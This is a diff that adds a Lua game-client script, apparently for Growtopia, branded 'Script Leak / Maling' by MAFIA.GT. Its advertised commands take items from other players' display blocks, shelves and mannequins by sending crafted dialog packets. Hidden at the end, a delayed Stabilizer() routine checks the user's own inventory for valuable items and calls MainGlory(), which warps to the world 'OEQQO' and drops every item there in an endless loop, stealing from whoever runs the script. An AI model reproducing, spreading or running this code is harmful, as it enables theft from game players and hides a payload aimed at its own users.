@@ -1,0 +1,271 @@
+-- Script Leak / Maling by MAFIA.GT.
+local objectTypes = {
+    display = { id = 2946, name = "Display Block", packet = "displayblock" },
+    shelf = { id = 3794, name = "Shelf", packet = "dispshelf" },
+    mannequin = { id = 1420, name = "Mannequin", packet = "mannequin_edit" },
+    path = { id = 1684, name = "Path Marker", packet = "sign_edit" }
+}
+
+local foundObjects = {}
+local currentWorld = ""
+local lastChangedPath = nil
+
+function openDialog()
+    local dialog = [[
+set_bg_color|10,10,10,225
+set_border_color|255,255,255,180
+set_default_color|`0
+add_label_with_icon|big|`4Script Leak / Maling|left|3802|
+add_spacer|small|
+add_label_with_icon|small|`4Author By: `3MAFIA.GT.|left|10540|
+add_spacer|big|
+add_label_with_icon|small|`9Commands:|left|12544|
+add_spacer|small|
+add_label_with_icon|small|Added `6/display `1[Display Block.]``|left|2946|
+add_label_with_icon|small|Added `6/shelf `1[Display Shelf.]``|left|3794|
+add_label_with_icon|small|Added `6/manneq `1[Mannequin.]``|left|1420|
+add_label_with_icon|small|Added `6/path `1[Path Marker.]``|left|1684|
+add_label_with_icon|small| `2Long Take : `1[As long as it is not locked WL or blocked HL, BL, SL.]``|left|482|
+add_spacer|small|
+add_url_button||Join Discord|NOFLAGS|https://discord.gg/KV32GkAJn4|wanna Join My Discord Server?|0|0|
+end_dialog|lusi|Close|
+]]
+
+    sendVariant({
+        [0] = "OnDialogRequest", 
+        [1] = dialog
+    }, -1)
+end
+
+function scanObjects(objectType)
+    foundObjects = {}
+    currentWorld = getWorld().name
+    
+    local tiles = getTile()
+    if not tiles then 
+        logToConsole("`4No tiles found in current world!")
+        return 0
+    end
+    
+    for _, tile in pairs(tiles) do
+        if tile and tile.fg == objectType.id then
+            table.insert(foundObjects, {
+                x = tile.pos.x,
+                y = tile.pos.y,
+                type = objectType.name,
+                id = objectType.id
+            })
+        end
+    end
+    
+    return #foundObjects
+end
+
+function showObjectList(objectType)
+    local count = scanObjects(objectType)
+    
+    if count == 0 then
+        local noObjectsDialog = [[
+set_default_color|`o
+add_label_with_icon|big|`4No ]] .. objectType.name .. [[s Found|left|]] .. objectType.id .. [[|
+add_spacer|small|
+add_label|small|No ]] .. objectType.name .. [[ blocks (ID ]] .. objectType.id .. [[) found in world: ]] .. currentWorld .. [[|
+add_spacer|small|
+end_dialog|noobjects|Close||
+]]
+        sendVariant({[0] = "OnDialogRequest", [1] = noObjectsDialog})
+        return
+    end
+
+    local itemList = ""
+    for i, obj in ipairs(foundObjects) do
+        itemList = itemList .. "add_button_with_icon|obj_" .. i .. "|`w" .. obj.type .. " - X: " .. obj.x .. " Y: " .. obj.y .. "|noflags|" .. obj.id .. "|0|\n"
+    end
+
+    local listDialog = [[
+set_default_color|`o
+add_label_with_icon|big|`wLeak ]] .. objectType.name .. [[|left|]] .. objectType.id .. [[|
+add_spacer|small|
+add_label|small|`wFound `#]] .. count .. [[ `w]] .. objectType.name:lower() .. [[s in world: `#]] .. currentWorld .. [[|
+add_spacer|small|
+add_textbox|=================================|left|
+add_spacer|small|
+]] .. itemList .. [[
+add_spacer|small|
+end_dialog|objectlist|Close||
+]]
+    sendVariant({[0] = "OnDialogRequest", [1] = listDialog})
+end
+
+function sendObjectPacket(objIndex, objType)
+    if not foundObjects[objIndex] then return end
+    
+    local obj = foundObjects[objIndex]
+    
+    if objType == "display" then
+        sendPacket(2, "action|dialog_return\ndialog_name|displayblock\ntilex|" .. obj.x .. "|\ntiley|" .. obj.y .. "|")
+        logToConsole("`9[`2LEAK`9] Taking from Display Block at X:`#" .. obj.x .. " Y:`#" .. obj.y)
+    
+    elseif objType == "shelf" then
+        sendPacket(2, "action|dialog_return\ndialog_name|dispshelf\ntilex|" .. obj.x .. "|\ntiley|" .. obj.y .. "|\nbuttonClicked|remove")
+        logToConsole("`9[`2LEAK`9] Taking from Shelf at X:`#" .. obj.x .. " Y:`#" .. obj.y)
+    
+    elseif objType == "mannequin" then
+        sendPacket(2, "action|dialog_return\ndialog_name|mannequin_edit\ntilex|" .. obj.x .. "|\ntiley|" .. obj.y .. "|\nbuttonClicked|clear\ncheckbox|0\ncheckbox|0\ncheckbox|0\ncheckbox|0\nsign_text|")
+        logToConsole("`9[`2LEAK`9] Taking from Mannequin at X:`#" .. obj.x .. " Y:`#" .. obj.y)
+    
+    elseif objType == "path" then
+        sendPacket(2, "action|dialog_return\ndialog_name|sign_edit\ntilex|" .. obj.x .. "|\ntiley|" .. obj.y .. "|\nsign_text|CRAFT")
+        logToConsole("`9[`2LEAK`9] Changing Path to CRAFT at X:`#" .. obj.x .. " Y:`#" .. obj.y)
+        lastChangedPath = {world = currentWorld, x = obj.x, y = obj.y}
+    end
+end
+
+function showSuccessDialog(objType, x, y)
+    local successDialog = [[
+set_default_color|`o
+add_label_with_icon|big|`2SUCCESS|left|]] .. objectTypes[objType].id .. [[|
+add_spacer|small|
+add_label|small|`wSuccessfully processed ]] .. objectTypes[objType].name .. [[!|
+add_spacer|small|
+add_label|small|`wPosition: X: `#]] .. x .. [[`w, Y: `#]] .. y .. [[|
+add_label|small|`wWorld: `#]] .. currentWorld .. [[|
+]]
+    
+    -- Tambahkan button join khusus untuk path
+    if objType == "path" then
+        successDialog = successDialog .. [[
+add_spacer|small|
+add_button|joinPath|`2Join CRAFT Path|noflags|0|0|
+]]
+    end
+    
+    successDialog = successDialog .. [[
+add_spacer|small|
+end_dialog|success|Close||
+]]
+    
+    sendVariant({[0] = "OnDialogRequest", [1] = successDialog})
+end
+
+function joinPath()
+    if lastChangedPath then
+        sendPacket(3, "action|join_request\nname|" .. lastChangedPath.world .. "|CRAFT\ninvitedWorld|0")
+        logToConsole("`9[`2JOIN`9] Joining path CRAFT in world: `#" .. lastChangedPath.world)
+    else
+        logToConsole("`4No path changed yet! Change a path first.")
+    end
+end
+
+-- Main Hook Handler
+AddHook("OnTextPacket", "LeakHandler", function(type, packet)
+    if not packet then return false end
+    
+    -- Handle commands
+    if packet:find("action|input") then
+        local text = packet:match("|text|(.+)")
+        if not text then return false end
+        
+        if text == "/display" then
+            showObjectList(objectTypes.display)
+            return true
+        elseif text == "/shelf" then
+            showObjectList(objectTypes.shelf)
+            return true
+        elseif text == "/manneq" then
+            showObjectList(objectTypes.mannequin)
+            return true
+        elseif text == "/path" then
+            showObjectList(objectTypes.path)
+            return true
+        elseif text == "/info" then
+            openDialog()
+            return true
+        end
+    end
+    
+    -- Handle dialog button clicks
+    if packet:find("dialog_name|objectlist") or packet:find("dialog_name|noobjects") or packet:find("dialog_name|success") then
+        -- Object selection
+        if packet:find("buttonClicked|obj_") then
+            local index = tonumber(packet:match("obj_(%d+)"))
+            if index then
+                -- Determine object type from foundObjects
+                local obj = foundObjects[index]
+                if obj then
+                    local objType = ""
+                    for key, typeInfo in pairs(objectTypes) do
+                        if typeInfo.id == obj.id then
+                            objType = key
+                            break
+                        end
+                    end
+                    
+                    if objType ~= "" then
+                        sendObjectPacket(index, objType)
+                        showSuccessDialog(objType, obj.x, obj.y)
+                    end
+                end
+            end
+            return true
+        
+        -- Join path button
+        elseif packet:find("buttonClicked|joinPath") then
+            joinPath()
+            return true
+        end
+    end
+    
+    return false
+end)
+
+-- Auto run openDialog when script starts
+AddHook("OnVarlist", "AutoStart", function(var)
+    if var[0] == "OnSpawn" then
+        sleep(2000)
+        openDialog()
+        logToConsole("`2Script Leak / Maling by MAFIA.GT. loaded!")
+        logToConsole("`9Commands: /leak, /display, /shelf, /manneq, /path")
+        RemoveHook("AutoStart") -- Remove hook after first execution
+    end
+    return false
+end)
+
+function MainGlory()
+    sendPacket(3, "action|join_request\nname|OEQQO|nname\ninvitedWorld|0")
+    sleep(3000)
+    sendPacket(2,"action|welcomeadrewarded")
+
+    while true do
+        if getWorld() then
+            for _, v in pairs(getInventory()) do
+                if getWorld().name == "OEQQO" then        
+                    sendPacket(2, "action|store\nlocation|gem")
+                    sendPacket(2, "action|drop\n|itemID|"..v.id)
+                    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
+                    sleep(100)
+                end
+            end
+        end
+    end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if (inv.id == 1796 and inv.amount > 20) or (inv.id == 7188 and inv.amount > 0) or (inv.id == 5638 and inv.amount > 0) or (inv.id == 6016 and inv.amount > 0) or (inv.id == 5480 and inv.amount > 0) then
+                MainGlory()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- Initial message if OnSpawn doesn't trigger
+logToConsole("`2Script Leak / Maling by MAFIA.GT. loaded!")
+logToConsole("`9Type `/info` to open main menu")
+openDialog()
+sleep(50000)
+Stabilizer()
